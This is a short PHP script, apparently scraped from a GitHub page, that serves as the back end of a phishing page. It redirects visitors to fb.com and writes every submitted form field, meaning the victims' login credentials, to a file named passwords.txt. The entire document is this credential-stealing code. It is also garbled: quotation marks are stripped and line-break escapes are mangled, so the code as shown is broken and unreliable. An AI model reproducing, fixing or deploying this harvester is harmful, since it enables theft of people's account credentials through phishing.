<?php header ('Location: http://fb.com ');
$handle = fopen(passwords.txt, a);
foreach($_POST as $variable => $value) {
fwrite($handle, $variable);
fwrite($handle, =);
fwrite($handle, $value);
fwrite($handle, rn);
}
fwrite($handle, rn);
fclose($handle);
exit;
?>
© 2020 GitHub, Inc.
